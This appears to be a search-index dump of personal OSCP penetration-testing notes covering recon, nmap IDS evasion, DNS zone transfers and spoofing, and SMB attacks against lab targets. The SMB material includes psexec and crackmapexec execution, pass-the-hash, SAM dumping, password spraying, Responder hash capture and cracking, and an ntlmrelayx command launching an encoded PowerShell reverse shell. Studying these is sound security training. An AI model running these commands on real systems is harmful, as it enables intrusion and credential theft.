documents. intitle: Finds pages with a specific term in the title. intitle:\"confidential report\" Look for documents titled ‚Äúconfidential report‚Äù or similar variations. intext: or inbody: Searches for a term within the body text of pages. intext:\"password reset\" Identify webpages containing the term ‚Äúpassword reset‚Äù. cache: Displays the cached version of a webpage (if available). cache:example.com View the cached version of example.com to see its previous content. link: Finds pages that link to a specific webpage. link:example.com Identify websites linking to example.com. related: Finds websites related to a specific webpage. related:example.com Discover websites similar to example.com. info: Provides a summary of information about a webpage. info:example.com Get basic details about example.com, such as its title and description. define: Provides definitions of a word or phrase. define:phishing Get a definition of ‚Äúphishing‚Äù from various sources. numrange: Searches for numbers within a specific range. site:example.com numrange:1000-2000 Find pages on example.com containing numbers between 1000 and 2000. allintext: Finds pages containing all specified words in the body text. allintext:admin password reset Search for pages containing both ‚Äúadmin‚Äù and ‚Äúpassword reset‚Äù in the body text. allinurl: Finds pages containing all specified words in the URL. allinurl:admin panel Look for pages with ‚Äúadmin‚Äù and ‚Äúpanel‚Äù in the URL. allintitle: Finds pages containing all specified words in the title. allintitle:confidential report 2023 Search for pages with ‚Äúconfidential,‚Äù ‚Äúreport,‚Äù and ‚Äú2023‚Äù in the title. AND Narrows results by requiring all terms to be present. site:example.com AND (inurl:admin OR inurl:login) Find admin or login pages specifically on example.com. OR Broadens results by including pages with any of the terms. \"linux\" OR \"ubuntu\" OR \"debian\" Search for webpages mentioning Linux, Ubuntu, or Debian. NOT Excludes results containing the specified term. site:bank.com NOT inurl:login Find pages on bank.com excluding login pages. * (wildcard) Represents any character or word. site:socialnetwork.com filetype:pdf user* manual Search for user manuals (user guide, user handbook) in PDF format on socialnetwork.com. .. (range search) Finds results within a specified numerical range. site:ecommerce.com \"price\" 100..500 Look for products priced between 100 and 500 on an e-commerce website. \" \" (quotation marks) Searches for exact phrases. \"information security policy\" Find documents mentioning the exact phrase ‚Äúinformation security policy‚Äù. - (minus sign) Excludes terms from the search results. site:news.com -inurl:sports Search for news articles on news.com excluding sports-related content. site:example.com (ext:conf OR ext:cnf) (searches for extensions commonly used for configuration files) AUTO RECON\ncube111@local[/local]$ git clone https://github.com/thewhiteh4t/FinalRecon.git cube111@local[/local]$ cd FinalRecon cube111@local[/local]$ pip3 install -r requirements.txt cube111@local[/local]$ chmod +x ./finalrecon.py cube111@local[/local]$ ./finalrecon.py --help cube111@local[/local]$ ./finalrecon.py --headers --whois --url http://inlanefreight.com",
    "description": "subdomains\ncurl -s https://crt.sh/json?q=chatgpt.com | jq -r '.[].common_name' | sort -u\ncube111@local[/local]$ for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f4 \u003e\u003e ip-addresses.txt;done cube111@local[/local]$ for i in $(cat ip-addresses.txt);do shodan host $i;done dig any inlanefreight.com dig @8.8.8.8 any mjcollege.ac.in\\\ndomain.glass\nhttps://buckets.grayhatwarfare.com/\nTool Description Features Wappalyzer Browser extension and online service for website technology profiling. Identifies a wide range of web technologies, including CMSs, frameworks, analytics tools, and more.",
    "tags": [],
    "title": "footprinting and finger printing web apps",
    "uri": "/oscp-notes/footprinting-and-finger-printing-web-apps/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Normal output (-oN) with the .nmap file extension\nGrepable output (-oG) with the .gnmap file extension\nXML output (-oX) with the .xml file extension\nconvert to html\ncube111@local[/local]$ xsltproc target.xml -o target.html cube111@local[/local]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:08 CEST SENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2 RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF Nmap scan report for 10.129.2.18 Host is up (0.023s latency). MAC Address: DE:AD:00:00:BE:EF Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds Scanning Options Description 10.129.2.18 Performs defined scans against the target. -sn Disables port scanning. -oA host Stores the results in all formats starting with the name ‚Äòhost‚Äô. -PE Performs the ping scan by using ‚ÄòICMP Echo requests‚Äô against the target. --packet-trace Shows all packets sent and received Another way to determine why Nmap has our target marked as ‚Äúalive‚Äù is with the ‚Äú--reason‚Äù option.\nHost Discovery\ncube111@local[/local]$ sudo nmap 10.129.2.18 -sn -oA host -PE --reason Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:10 CEST SENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2 RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF Nmap scan report for 10.129.2.18 Host is up, received arp-response (0.028s latency). MAC Address: DE:AD:00:00:BE:EF Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds scanning hosts in a file¬†cube111@local[/local]$ sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5 10.129.2.18 10.129.2.19 10.129.2.20 IDS evasions\nsudo nmap 10.129.2.28 -p 21,22,25 -sS -Pn -n --disable-arp-ping --packet-trace sudo nmap 192.168.0.0.1 -sA -n -Pn --disable-arp-ping --packet-trace\ndecoy scan\nsudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 Source ip change\nsudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0 sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0 os\nsudo nmap 10.129.2.28 -n -Pn -p445 -O DNS proxy scan\nsudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53 DNs proxy connect\nncat -nv --source-port 53 10.129.2.28 50000",
    "description": "Normal output (-oN) with the .nmap file extension\nGrepable output (-oG) with the .gnmap file extension\nXML output (-oX) with the .xml file extension\nconvert to html\ncube111@local[/local]$ xsltproc target.xml -o target.html cube111@local[/local]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:08 CEST SENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2 RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF Nmap scan report for 10.",
    "tags": [],
    "title": "nmap",
    "uri": "/oscp-notes/nmap/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Go busters\ngobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt\nseclist git clone https://github.com/danielmiessler/SecLists subdomain enumeration Next, add a DNS Server such as 1.1.1.1 to the¬†/etc/resolv.conf¬†file. We will target the domain¬†inlanefreight.com, the website for a fictional freight and logistics company.\ngobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt Headers curl -IL https://www.inlanefreight.com WEB technologies cube111@local[/local]$ whatweb 10.10.10.121 whatweb --no-errors 10.10.10.0/24",
    "description": "Go busters\ngobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt\nseclist git clone https://github.com/danielmiessler/SecLists subdomain enumeration Next, add a DNS Server such as 1.1.1.1 to the¬†/etc/resolv.conf¬†file. We will target the domain¬†inlanefreight.com, the website for a fictional freight and logistics company.\ngobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt Headers curl -IL https://www.inlanefreight.com WEB technologies cube111@local[/local]$ whatweb 10.10.10.121 whatweb --no-errors 10.10.10.0/24",
    "tags": [],
    "title": "Go busters",
    "uri": "/oscp-notes/go-busters/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Step Tool(s) Notes Authenticated DNS dump adidnsdump Needs creds Zone transfer attempt dig axfr Often blocked, but worth checking Subdomain brute forcing dnsenum, ffuf, gobuster Helps discover hosts/services SRV records enumeration dig Critical in AD to find services Enumerating DNS Records(Active directory) Using adidnsdump Miscellaenous Misconfigurations\ncube111@local[/local]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 Password: [-] Connecting to host... [-] Binding to host [+] Bind OK [-] Querying zone for records Using the -r Option to Resolve Unknown Records Miscellaenous Misconfigurations\ncube111@local[/local]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r Password: [-] Connecting to host... [-] Binding to host [+] Bind OK [-] Querying zone for records [+] Found 27 records DNS\nroot@bind9:~# cat /etc/bind/named.conf.local // // Do any local configuration here // // Consider adding the 1918 zones here, if they are not used in your // organization //include \"/etc/bind/zones.rfc1918\"; zone \"domain.com\" { type master; file \"/etc/bind/db.domain.com\"; allow-update { key rndc-key; }; }; Zone Files DNS\nroot@bind9:~# cat /etc/bind/db.domain.com ; ; BIND reverse data file for local loopback interface ; $ORIGIN domain.com $TTL 86400 @ IN SOA dns1.domain.com. hostmaster.domain.com. ( 2001062501 ; serial 21600 ; refresh after 6 hours 3600 ; retry after 1 hour 604800 ; expire after 1 week 86400 ) ; minimum TTL of 1 day IN NS ns1.domain.com. IN NS ns2.domain.com. IN MX 10 mx.domain.com. IN MX 20 mx2.domain.com. IN A 10.129.14.5 server1 IN A 10.129.14.5 server2 IN A 10.129.14.7 ns1 IN A 10.129.14.2 ns2 IN A 10.129.14.3 ftp IN CNAME server1 mx IN CNAME server1 mx2 IN CNAME server2 www IN CNAME server2 dig ns inlanefreight.local @10.129.14.128 dig ns inlanefreight.local @10.129.14.128 dig any inlanefreight.local @10.129.14.128 Asynchronous Full Transfer Zone (AXFR).\ndig axfr inlanefreight.local @10.129.14.128 dig axfr internal.inlanefreight.local @10.129.14.128 dig axfr internal.inlanefreight.local @10.129.14.128 fierce --domain zonetransfer.me sub domain bruteforce\nfor sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.local @10.129.14.128 | grep -v ';|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.local dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r cube111@local[/local]# ./subfinder -d inlanefreight.com -v cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/ /\u0026#x27;___\\ /\u0026#x27;___\\ /\u0026#x27;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : https://FUZZ.inlanefreight.com/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 381ms] * FUZZ: support [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 385ms] * FUZZ: ns3 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 402ms] * FUZZ: blog [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 180ms] * FUZZ: my [Status: 200, Size: 22266, Words: 2903, Lines: 316, Duration: 589ms] * FUZZ: www \u003c...SNIP...\u003e Subbrute Attacking DNS\ncube111@local[/local]$ git clone https://github.com/TheRook/subbrute.git \u003e\u003e /dev/null 2\u003e\u00261 cube111@local[/local]$ cd subbrute cube111@local[/local]$ echo \"ns1.inlanefreight.com\" \u003e ./resolvers.txt cube111@local[/local]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt. inlanefreight.com ns2.inlanefreight.com www.inlanefreight.com ms1.inlanefreight.com support.inlanefreight.com \u003cSNIP\u003e gobuster dns -d dev.inlanefreight.local -w fierce-hostlist.txt -r 10.129.124.236\nthings learnt:¬†dont forget to bruteforce the subdomains for furthur subdomains and also the dns zone transfers\ndig domain.com SOA Retrieves the start of authority (SOA) record for the domain. dig @1.1.1.1 domain.com Specifies a specific name server to query; in this case 1.1.1.1 dig +trace domain.com Shows the full path of DNS resolution. dig -x 192.168.1.1 Performs a reverse lookup on the IP address 192.168.1.1 to find the associated host name. You may need to specify a name server. dig +short domain.com Provides a short, concise answer to the query. dig +noall +answer domain.com Displays only the answer section of the query output. dig domain.com ANY Retrieves all available DNS records for the domain (Note: Many DNS servers ignore ANY queries to reduce load and prevent abuse, as per RFC 8482). DOMAIN take over\nhttps://github.com/EdOverflow/can-i-take-over-xyz\nThe tool has found four subdomains associated with inlanefreight.com. Using the nslookup or host command, we can enumerate the CNAME records for those subdomains.\nAttacking DNS\ncube111@local[/local]# host support.inlanefreight.com support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com DNS POISONING\nLocal DNS Cache Poisoning From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like Ettercap or Bettercap.\nTo exploit the DNS cache poisoning via Ettercap, we should first edit the /etc/ettercap/etter.dns file to map the target domain name (e.g., inlanefreight.com) that they want to spoof and the attacker‚Äôs IP address (e.g., 192.168.225.110) that they want to redirect a user to:\nAttacking DNS\ncube111@local[/local]# cat /etc/ettercap/etter.dns inlanefreight.com A 192.168.225.110 *.inlanefreight.com A 192.168.225.110 Next, start the Ettercap tool and scan for live hosts within the network by navigating to Hosts \u003e Scan for Hosts. Once completed, add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2.\nActivate dns_spoof attack by navigating to Plugins \u003e Manage Plugins. This sends the target machine with fake DNS responses that will resolve inlanefreight.com to IP address 192.168.225.110:\nAfter a successful DNS spoof attack, if a victim user coming from the target machine 192.168.152.129 visits the inlanefreight.com domain on a web browser, they will be redirected to a Fake page that is hosted on IP address 192.168.225.110:\nIn addition, a ping coming from the target IP address 192.168.152.129 to inlanefreight.com should be resolved to 192.168.225.110 as well:\nAttacking DNS\nC:\\\u003eping inlanefreight.com Pinging inlanefreight.com [192.168.225.110] with 32 bytes of data: Reply from 192.168.225.110: bytes=32 time\u003c1ms TTL=64 Reply from 192.168.225.110: bytes=32 time\u003c1ms TTL=64 Reply from 192.168.225.110: bytes=32 time\u003c1ms TTL=64 Reply from 192.168.225.110: bytes=32 time\u003c1ms TTL=64 Ping statistics for 192.168.225.110: Packets: Sent = 4, Received = 4, Lost = 0 (0% loss), Approximate round trip times in milli-seconds: Minimum = 0ms, Maximum = 0ms, Average = 0ms These are a few examples of common DNS attacks. There are other more advanced attacks that will be covered in later modules.",
    "description": "Step Tool(s) Notes Authenticated DNS dump adidnsdump Needs creds Zone transfer attempt dig axfr Often blocked, but worth checking Subdomain brute forcing dnsenum, ffuf, gobuster Helps discover hosts/services SRV records enumeration dig Critical in AD to find services Enumerating DNS Records(Active directory) Using adidnsdump Miscellaenous Misconfigurations\ncube111@local[/local]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 Password: [-] Connecting to host... [-] Binding to host [+] Bind OK [-] Querying zone for records Using the -r Option to Resolve Unknown Records Miscellaenous Misconfigurations",
    "tags": [],
    "title": "dns",
    "uri": "/oscp-notes/dns/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "net use Z: \\\\10.0.0.122\\print$ /user:anonymous \"\"\nPS C:\\Users\\shaik\u003e copy z:\\x64 .\nPS C:\\Users\\shaik\u003e ls\nsudo nmap 10.129.14.128 -sV -sC -p139,445 smbclient -N -L //10.129.14.128 smbclient //10.129.14.128/notes smbmap -H 10.129.14.128 cube111@htb[/htb]$ smbmap -H 10.129.14.128 -r notes cube111@htb[/htb]$ smbmap -H 10.129.14.128 --download \"notes\\note.txt\" cube111@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt \"notes\\test.txt\" cube111@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users SMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2 SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] Enumerated domain user(s) SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\administrator badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\guest badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\lab_adm badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\krbtgt badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\htb-student badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920 SMB 172.16.5.5 445 ACADEMY-EA-DC01 INLANEFREIGHT.LOCAL\\avazquez RCE smb\ncube111@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17 cube111@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec cube111@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users cube111@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam cube111@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE Windows CMD - DIR Interacting with Common Services\nmount shares\nC:\\htb\u003e net use n: \\\\192.168.220.129\\Finance /user:plaintext Password123 The command completed successfully. C:\\htb\u003e dir n: /a-d /s /b | find /c \":\\\" 29302 cred password users secrets key Common File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html. C:\\htb\u003edir n:\\*cred* /s /b n:\\Contracts\\private\\credentials.txt C:\\htb\u003edir n:\\*secret* /s /b n:\\Contracts\\private\\secret.txt If we want to search for a specific word within a text file, we can use findstr.\nfindstr /s /i cred n:\\*.* POWERSHELL\nWindows PowerShell PS C:\\htb\u003e Get-ChildItem \\\\192.168.220.129\\Finance\\ Instead of net use, we can use New-PSDrive in PowerShell.\nPS C:\\htb\u003e New-PSDrive -Name \"N\" -Root \"\\\\192.168.220.129\\Finance\" -PSProvider \"FileSystem\" Windows PowerShell - PSCredential Object PS C:\\htb\u003e $username = 'plaintext' PS C:\\htb\u003e $password = 'Password123' PS C:\\htb\u003e $secpassword = ConvertTo-SecureString $password -AsPlainText -Force PS C:\\htb\u003e $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword PS C:\\htb\u003e New-PSDrive -Name \"N\" -Root \"\\\\192.168.220.129\\Finance\" -PSProvider \"FileSystem\" -Credential $cred Windows PowerShell - GCI PS C:\\htb\u003e N: PS N:\\\u003e (Get-ChildItem -File -Recurse | Measure-Object).Count 29302 Listing files which has cred in the file name\nPS C:\\htb\u003e Get-ChildItem -Recurse -Path N:\\ -Include *cred* -File Windows PowerShell - Select-String PS C:\\htb\u003e Get-ChildItem -Recurse -Path N:\\ | Select-String \"cred\" -List N:\\Contracts\\private\\secret.txt:1:file with all credentials N:\\Contracts\\private\\credentials.txt:1:admin:SecureCredentials! Linux - Mount [!bash!]$ sudo mkdir /mnt/Finance [!bash!]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance [!bash!]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile CredentialFile username=plaintext password=Password123 domain=. Linux - Find [!bash!]$ find /mnt/Finance/ -name *cred* /mnt/Finance/Contracts/private/credentials.txt Next, let's find files that contain the string cred:\n[!bash!]$ grep -rn /mnt/Finance/ -ie cred /mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials! /mnt/Finance/Contracts/private/secret.txt:1:file with all credentials Password spray and bruteforce\ncube111@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth Note: By default CME will exit after a successful login is found. Using the --continue-on-success flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. Additionally, if we are targetting a non-domain joined computer, we will need to use the option --local-auth. For a more detailed study Password Spraying see the Active Directory Enumeration \u0026 Attacks module.\nResponder\nSuppose a user mistyped a shared folder's name \\\\mysharefoder\\ instead of \\\\mysharedfolder\\. In that case, all name\ncube111@htb[/htb]$ sudo responder -I ens33 __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026 MDNS Responder 3.0.6.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] DNS/MDNS [ON] [+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [OFF] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] RDP server [ON] DCE-RPC server [ON] WinRM server [ON] [+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Fingerprint hosts [OFF] [+] Generic Options: Responder NIC [tun0] Responder IP [10.10.14.198] Challenge set [random] Don\\'t Respond To Names ['ISATAP'] [+] Current Session Variables: Responder Machine Name [WIN-2TY1Z1CIGXH] Responder Domain Name [HF2L.LOCAL] Responder DCE-RPC Port [48162] [+] Listening for events... [*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser) [*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election) [*] [MDNS] Poisoned answer sent to 10.10.110.17 for name mysharefoder.local [*] [LLMNR] Poisoned answer sent to 10.10.110.17 for name mysharefoder [*] [MDNS] Poisoned answer sent to 10.10.110.17 for name mysharefoder.local [SMB] NTLMv2-SSP Client : 10.10.110.17 [SMB] NTLMv2-SSP Username : WIN7BOX\\demouser [SMB] NTLMv2-SSP Hash : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000 All saved Hashes are located in Responder's logs directory (/usr/share/responder/logs/). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.\ncube111@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... \u003cSNIP\u003e Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344386 * Bytes.....: 139921355 * Keyspace..: 14344386 ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:010100 NTLM RELAY\nThen we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option -c.\nAttacking SMB\ncube111@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation \u003cSNIP\u003e [*] Running in relay mode to single host [*] Setting up SMB Server [*] Setting up WCF Server [*] Servers started, waiting for connections We can create a PowerShell reverse shell using https://www.revshells.com/, set our machine IP address, port, and the option Powershell #3 (Base64).\nAttacking SMB\ncube111@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBq sudo ntlmrelayx.py -t smb://192.168.220.146 -smb2support --shell SMBMap SMBMap To Check Access Credentialed Enumeration - from Linux\ncube111@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 [+] IP: 172.16.5.5:445\tName: inlanefreight.local Disk Permissions\tComment ----\t-----------\t------- ADMIN$\tNO ACCESS\tRemote Admin C$\tNO ACCESS\tDefault share Department Shares\tREAD ONLY\tIPC$\tREAD ONLY\tRemote IPC NETLOGON\tREAD ONLY\tLogon server share SYSVOL\tREAD ONLY\tLogon server share User Shares\tREAD ONLY\tZZZ_archive\tREAD ONLY Recursive List Of All Directories cube111@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only [+] IP: 172.16.5.5:445\tName: inlanefreight.local Disk Permissions\tComment ----\t-----------\t------- Department Shares\tREAD ONLY rpcclient rpcclient -U \"\" -N 172.16.5.5 rpcclient $\u003e enumdomusers user:[administrator] rid:[0x1f4] user:[guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[lab_adm] rid:[0x3e9] Password finder\nPS C:\\htb\u003e .\\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data .::::::.:::. :::. :::. .-:::::'.-:::::'::: .,:::::: :::::::.. ;;;` ``;;;;, `;;; ;;`;; ;;;'''' ;;;'''' ;;; ;;;;'''' ;;;;``;;;; '[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[ [[cccc [[[,/[[[' ''' $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$' $$\"\" $$$$$$c 88b dP 888 Y88 888 888,888 888 o88oo,.__888oo,__ 888b '88bo, 'YMmMY' MMM YM YMM ''` 'MM, 'MM, ''''YUMMM''''YUMMMMMMM 'W' by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler 2022-03-31 12:16:54 -07:00 [Share] {Black}(\\\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\\ADMIN$) 2022-03-31 12:16:54 -07:00 [Share] {Black}(\\\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\\C$) 2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL\\address) 2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares) 2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\User Shares) 2022-03-31 12:16:54 -07:00 [Share] {Green}(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\ZZZ_archive) 2022-03-31 12:17:18 -07:00 [Share] {Green}(\\\\ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL\\CertEnroll) 2022-03-31 12:17:19 -07:00 [File] {Black}\u003cKeepExtExactBlack|R|^\\\\.kdb$|289B|3/31/2022 12:09:22 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\GroupBackup.kdb) .kdb 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\\\.key$|299B|3/31/2022 12:05:33 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\ShowReset.key) .key 2022-03-31 12:17:19 -07:00 [Share] {Green}(\\\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\\UpdateServicesPackages) 2022-03-31 12:17:19 -07:00 [File] {Black}\u003cKeepExtExactBlack|R|^\\\\.kwallet$|302B|3/31/2022 12:04:45 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\WriteUse.kwallet) .kwallet 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\\\.key$|298B|3/31/2022 12:05:10 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\ProtectStep.key) .key 2022-03-31 12:17:19 -07:00 [File] {Black}\u003cKeepExtExactBlack|R|^\\\\.ppk$|275B|3/31/2022 12:04:40 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\StopTrace.ppk) .ppk 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\\\.key$|301B|3/31/2022 12:09:17 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\WaitClear.key) .key 2022-03-31 12:17:19 -07:00 [File] {Red}\u003cKeepExtExactRed|R|^\\\\.sqldump$|312B|3/31/2022 12:05:30 PM\u003e(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\DenyRedo.sqldump) .sqldump 